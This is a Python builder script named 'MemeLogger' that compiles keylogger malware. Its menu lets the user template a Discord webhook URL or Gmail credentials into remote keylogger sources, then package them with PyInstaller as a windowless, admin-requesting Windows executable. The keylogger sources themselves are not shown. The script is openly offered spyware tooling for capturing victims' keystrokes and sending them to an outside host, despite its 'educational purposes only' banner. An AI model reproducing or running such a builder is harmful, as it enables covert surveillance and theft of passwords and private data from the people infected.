# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                  MemeLogger                                 #
#                          ! EDUCATIONAL PURPOSES ONLY !                      #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #


import os
from getpass import getpass
import subprocess
from colorama import init, Fore

init(autoreset=True)
python_file = ""
output_dir = r".\output"


def build():
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    try:
        subprocess.run(
            [
                "pyinstaller",
                "--onefile",
                "--disable-windowed-traceback",
                "--uac-admin",
                "-n",
                "MemeLogger",
                "--distpath",
                output_dir,
                "--workpath",
                os.path.join(output_dir, "build"),
                "--specpath",
                os.path.join(output_dir, "specs"),
                python_file,
                "-w",
            ],
            check=True,
        )
    except subprocess.CalledProcessError:
        print(f"{Fore.LIGHTRED_EX}Failed to build {os.path.abspath(python_file)}")
        input("Press enter to exit...")
    print(f"\n{Fore.GREEN}Build completed successfully.{Fore.RESET}")
    print(f"{Fore.GREEN}Output directory: {os.path.abspath(output_dir)}{Fore.RESET}")
    input("Press enter to exit...")


def main():
    global python_file
    while True:
        os.system("cls")
        print(
            f"{Fore.LIGHTRED_EX}                                                 $$\\                                                   "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                 $$ |                                                  "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$$$$$\\$$$$\\   $$$$$$\\  $$$$$$\\$$$$\\   $$$$$$\\  $$ | $$$$$$\\   $$$$$$\\   $$$$$$\\   $$$$$$\\   $$$$$$\\  "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$  _$$  _$$\\ $$  __$$\\ $$  _$$  _$$\\ $$  __$$\\ $$ |$$  __$$\\ $$  __$$\\ $$  __$$\\ $$  __$$\\ $$  __$$\\ "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ / $$ / $$ |$$$$$$$$ |$$ / $$ / $$ |$$$$$$$$ |$$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \\__|"
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ | $$ | $$ |$$   ____|$$ | $$ | $$ |$$   ____|$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ | $$ | $$ |\\$$$$$$$\\ $$ | $$ | $$ |\\$$$$$$$\\ $$ |\\$$$$$$  |\\$$$$$$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |      "
        )
        print(
            f"{Fore.LIGHTRED_EX} \\__| \\__| \\__| \\_______|\\__| \\__| \\__| \\_______|\\__| \\______/  \\____$$ | \\____$$ | \\_______|\\__|      "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                               $$\\   $$ |$$\\   $$ |                    "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                               \\$$$$$$  |\\$$$$$$  |                    "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                                \\______/  \\______/                     "
        )
        print(
            f"\n{Fore.LIGHTYELLOW_EX}1{Fore.RESET} - {Fore.LIGHTGREEN_EX}remote keylogger (discord webhook)"
        )
        print(
            f"{Fore.LIGHTYELLOW_EX}2{Fore.RESET} - {Fore.LIGHTGREEN_EX}remote keylogger (gmailsmtp)"
        )
        print(
            f"{Fore.LIGHTYELLOW_EX}3{Fore.RESET} - {Fore.LIGHTGREEN_EX}local keylogger"
        )
        print(f"{Fore.LIGHTYELLOW_EX}4{Fore.RESET} - {Fore.LIGHTGREEN_EX}exit")
        choice = input("\nEnter your choice: ")
        try:
            choice = int(choice)
        except ValueError:
            print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
            input("Press enter to continue...")
            os.system("cls")
            continue
        if choice == 1:
            url = input("\nEnter discord webhook url: ")
            base_dir = os.path.dirname(os.path.abspath(__file__))
            python_file = os.path.join(base_dir, "remote", "discord", "keylogger.py")
            with open(python_file, "r", encoding="utf-8") as f:
                content = f.read()
            with open(r"keylogger.py", "w", encoding="utf-8") as f:
                f.write(content.replace("YOUR_WEBHOOK_URL", url))
            python_file = r".\keylogger.py"
            build()
            try:
                os.remove(r".\keylogger.py")
            except (FileNotFoundError, PermissionError):
                pass
            break
        elif choice == 2:
            print(f"\n{Fore.LIGHTYELLOW_EX}WARNING:{Fore.RESET}")
            print(f"1. You need to either enable {Fore.LIGHTYELLOW_EX}'Less secure app access'{Fore.RESET} in your Google Account settings.")
            print(f"2. Your Gmail password will be {Fore.LIGHTRED_EX}stored in plain text{Fore.RESET} in the file and will {Fore.LIGHTRED_EX}not be encrypted{Fore.RESET}!")
            print(f"3. Please use a {Fore.LIGHTRED_EX}non-important{Fore.RESET} Google account for security reasons!!!")
            choice2 = input("\nAre you sure you want to continue? (y/n): ")
            if choice2.strip().lower() == "y" or choice2.strip().lower() == "yes":
                pass
            else:
                print(choice2)
                continue

            base_dir = os.path.dirname(os.path.abspath(__file__))
            gmail_path = os.path.join(base_dir, "remote", "gmail", "keylogger.py")
            email = input("\nEnter your gmail: ")
            password = getpass("Enter your password: ")

            with open(gmail_path, "r", encoding="utf-8") as f:
                content = f.read()
            with open(r"keylogger.py", "w", encoding="utf-8") as f:
                f.write(
                    content.replace("YOUR_GMAIL", email).replace(
                        "YOUR_PASSWORD", password
                    )
                )
            python_file = r".\keylogger.py"
            build()
            try:
                os.remove(r".\keylogger.py")
            except (FileNotFoundError, PermissionError):
                pass
            break
        elif choice == 3:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            python_file = os.path.join(base_dir, "local", "keylogger.py")
            build()
            break
        elif choice == 4:
            break
        else:
            print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
            input("Press enter to continue...")
            os.system("cls")
            continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
